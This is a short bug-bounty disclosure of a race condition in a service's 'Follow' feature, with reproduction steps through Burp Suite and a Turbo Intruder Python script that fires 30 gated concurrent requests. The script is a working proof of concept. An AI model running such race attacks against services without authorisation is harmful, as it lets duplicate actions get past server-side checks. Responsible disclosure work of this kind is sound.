## Original Report

## Summary:
Hi team,
There is a race condition vulnerability when following a user. If you send the `Follow` requests asynchronously, you can follow a user multiple times instead getting an error message.
I've been using Turbo Intruder extension at Burp Suite for trying Race Condition attacks. I can recommend it for reproduce this vulnerability.

## Steps To Reproduce:

  1. Go to any user's profile
  1. Turn on Intercept at Burp Suite and click `Follow` button
  1. Right click to follow request, click `Send to turbo intruder` and drop the request
  1. Add a fake header that contains `%s` value. Like `Test: %s `
  1. Paste this Python code to Turbo Intruder :
       ```python
def queueRequests(target, wordlists):
        engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False
                           )

        for i in range(30):
            engine.queue(target.req, str(i), gate='race1')

        engine.openGate('race1')
        engine.complete(timeout=60)
def handleResponse(req, interesting):
        table.add(req)
       ```
 5. Click `Attack` button. Turbo Intruder will send 30 requests, check the status codes. If you see multiple responses with `201 Created` status, that means you followed the user multiple times.
